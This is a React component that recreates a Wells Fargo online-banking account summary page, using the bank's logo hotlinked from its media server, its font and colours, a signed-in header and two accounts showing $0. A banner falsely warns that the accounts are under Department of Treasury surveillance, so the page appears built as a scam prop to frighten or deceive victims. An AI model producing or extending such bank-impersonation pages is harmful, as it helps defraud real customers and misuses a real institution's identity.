import { useNavigate } from 'react-router-dom';
import FooterHelp from '../components/Footer/FooterHelp';
import FooterLinks from '../components/Footer/FooterLinks';
import FooterDisclaimer from '../components/Footer/FooterDisclaimer';

const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';

export default function Dashboard() {
  const navigate = useNavigate();

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', fontFamily: f }}>
      {/* Header */}
      <header style={{ backgroundColor: '#D71E28', borderBottom: '4px solid #FFCD41', height: '60px', display: 'flex', alignItems: 'center' }}>
        <div className="max-w-[1400px] mx-auto w-full" style={{ padding: '0 32px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ textDecoration: 'none' }}>
            <img
              src="https://www17.wellsfargomedia.com/assets/images/rwd/wf_logo_220x23.png"
              alt="Wells Fargo"
              style={{ height: '20px', filter: 'brightness(0) invert(1)' }}
            />
          </a>
          <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
            <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '22px', height: '22px', color: '#fff', cursor: 'pointer' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
            </svg>
            <div style={{ width: '1px', height: '28px', backgroundColor: 'rgba(255,255,255,0.4)' }} />
            <a
              href="/"
              onClick={(e) => { e.preventDefault(); navigate('/'); }}
              style={{ color: '#fff', textDecoration: 'none', fontSize: '0.88rem', display: 'flex', alignItems: 'center', gap: '6px' }}
              className="hover:underline"
            >
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '16px', height: '16px' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              Sign Off
            </a>
            <div style={{ width: '1px', height: '28px', backgroundColor: 'rgba(255,255,255,0.4)' }} />
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
              <div style={{ width: '36px', height: '36px', borderRadius: '50%', border: '2px solid #fff', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '20px', height: '20px', color: '#fff' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              </div>
              <div style={{ color: '#fff', lineHeight: '1.2' }}>
                <div style={{ fontSize: '0.76rem' }}>Welcome</div>
                <div style={{ fontSize: '0.88rem', fontWeight: 600 }}>AB</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '14px', height: '14px', color: '#fff' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
              </svg>
            </div>
          </div>
        </div>
      </header>

      {/* Main content area - gray background */}
      <div style={{ backgroundColor: '#f2f2f2', flex: 1 }}>
        <div className="max-w-[960px] mx-auto" style={{ padding: '32px 20px 60px' }}>
          <h1 style={{ fontFamily: f, fontSize: '1.76rem', fontWeight: 300, fontStyle: 'italic', color: '#141414', margin: '0 0 24px' }}>
            Account Summary
          </h1>

          {/* Warning banner */}
          <div style={{ backgroundColor: '#FFF3CD', border: '1px solid #F0E0A0', borderRadius: '4px', padding: '14px 20px', marginBottom: '24px', display: 'flex', alignItems: 'center', gap: '12px' }}>
            <span style={{ fontSize: '1.2rem' }}>⚠️</span>
            <span style={{ fontFamily: f, fontSize: '0.94rem', color: '#664D03' }}>
              Accounts under surveillance by the Department of Treasury.
            </span>
          </div>

          {/* Everyday Checking */}
          <div style={{ backgroundColor: '#fff', borderRadius: '4px', marginBottom: '16px', boxShadow: '0 1px 3px rgba(0,0,0,0.1)', overflow: 'hidden', display: 'flex', alignItems: 'stretch' }}>
            <div style={{ width: '4px', backgroundColor: '#D71E28', flexShrink: 0 }} />
            <div style={{ flex: 1, padding: '24px 20px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <h2 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 700, color: '#D71E28', margin: 0, letterSpacing: '0.5px' }}>EVERYDAY CHECKING</h2>
              <div style={{ textAlign: 'right' }}>
                <div style={{ fontFamily: f, fontSize: '1.29rem', fontWeight: 400, color: '#141414' }}>$0</div>
                <div style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070' }}>Available balance</div>
              </div>
            </div>
            <div style={{ width: '40px', backgroundColor: '#1a1a2e', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer', flexShrink: 0 }}>
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '20px', height: '20px', color: '#fff' }} fill="currentColor" viewBox="0 0 24 24">
                <circle cx="12" cy="5" r="2" /><circle cx="12" cy="12" r="2" /><circle cx="12" cy="19" r="2" />
              </svg>
            </div>
          </div>

          {/* Investment */}
          <div style={{ backgroundColor: '#fff', borderRadius: '4px', marginBottom: '40px', boxShadow: '0 1px 3px rgba(0,0,0,0.1)', overflow: 'hidden', display: 'flex', alignItems: 'stretch' }}>
            <div style={{ width: '4px', backgroundColor: '#D71E28', flexShrink: 0 }} />
            <div style={{ flex: 1, padding: '24px 20px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <h2 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 700, color: '#D71E28', margin: 0, letterSpacing: '0.5px' }}>INVESTMENT</h2>
              <div style={{ textAlign: 'right' }}>
                <div style={{ fontFamily: f, fontSize: '1.29rem', fontWeight: 400, color: '#141414' }}>$0</div>
                <div style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070' }}>Available balance</div>
              </div>
            </div>
            <div style={{ width: '40px', backgroundColor: '#1a1a2e', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer', flexShrink: 0 }}>
              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '20px', height: '20px', color: '#fff' }} fill="currentColor" viewBox="0 0 24 24">
                <circle cx="12" cy="5" r="2" /><circle cx="12" cy="12" r="2" /><circle cx="12" cy="19" r="2" />
              </svg>
            </div>
          </div>

          {/* Bottom promo cards */}
          <div style={{ backgroundColor: '#fff', borderRadius: '4px', boxShadow: '0 1px 3px rgba(0,0,0,0.1)', display: 'flex', overflow: 'hidden' }}>
            <div style={{ flex: 1, padding: '24px 20px', borderRight: '1px solid #e2dede' }}>
              <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Find a credit card</h3>
              <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: 0, lineHeight: '1.4' }}>Choose from cash rewards low intro rate and more.</p>
            </div>
            <div style={{ flex: 1, padding: '24px 20px', borderRight: '1px solid #e2dede' }}>
              <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Stock Fractions</h3>
              <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: 0, lineHeight: '1.4' }}>Start investing with just $10</p>
            </div>
            <div style={{ flex: 1, padding: '24px 20px' }}>
              <h3 style={{ fontFamily: f, fontSize: '1rem', fontWeight: 600, color: '#141414', margin: '0 0 8px' }}>Invest and bank</h3>
              <p style={{ fontFamily: f, fontSize: '0.82rem', color: '#787070', margin: 0, lineHeight: '1.4' }}>All in one place - the Wells Fargo Mobile app</p>
            </div>
          </div>
        </div>
      </div>

      {/* Full Footer */}
      <FooterHelp />
      <FooterLinks />
      <FooterDisclaimer />
    </div>
  );
}
